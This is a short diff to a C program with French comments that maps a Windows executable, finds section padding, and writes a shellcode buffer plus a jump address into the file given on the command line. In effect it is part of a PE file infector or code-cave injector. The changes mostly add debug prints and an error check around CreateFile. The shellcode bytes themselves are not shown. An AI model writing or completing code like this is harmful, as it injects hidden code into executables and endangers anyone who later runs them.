@@ -173,12 +173,26 @@ printf("Entete precedente : %p \r\n", *infosSection);
     long differenceDeTaille = (AligneSur(fileAlignment,tailleSection) - tailleSection);
 printf("Difference de taille:  %i \r\n", differenceDeTaille);
 
-    UnmapViewOfFile(executableEnMemoire);
-    CloseHandle(executableHandle);
-    CloseHandle(executableMappe);
+printf(" executableen memoire %p \r\n", executableEnMemoire);
 
-    HANDLE fp = CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
-    SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN);
+    UnmapViewOfFile(executableEnMemoire);
+    printf("executableHandle %p \r\n", executableHandle);
+        CloseHandle(executableHandle);
+    printf("executableMappe %p \r\n", executableMappe);
+
+CloseHandle(executableMappe);
+
+    printf("filename %s, param2 %i, param3 %i, param4 %i, param5 %i, param6 %i, param7 %i \r\n", argv[1], GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
+    printf("INVALID HANDLE_VALUE == %i \r\n", INVALID_HANDLE_VALUE);
+
+
+HANDLE fp = CreateFile( argv[1] , GENERIC_WRITE ,  FILE_SHARE_WRITE , NULL , OPEN_ALWAYS , FILE_ATTRIBUTE_NORMAL , NULL );
+    if (fp == INVALID_HANDLE_VALUE)
+    {
+	    printf("createFIle INVALID_HANDLE_VALUE \r\n");
+	    printf("Error Code : %i \r\n", GetLastError());
+    }
+   SetFilePointer(fp,pointerToRaw,0,FILE_BEGIN);
 
     WriteFile(fp,shellcode,(strlen(shellcode) + 0),&taille,NULL);//on écrit notre shellcode.
     WriteFile(fp,&decallage,sizeof(DWORD),&taille,NULL);// notre adresse sur laquel jump !
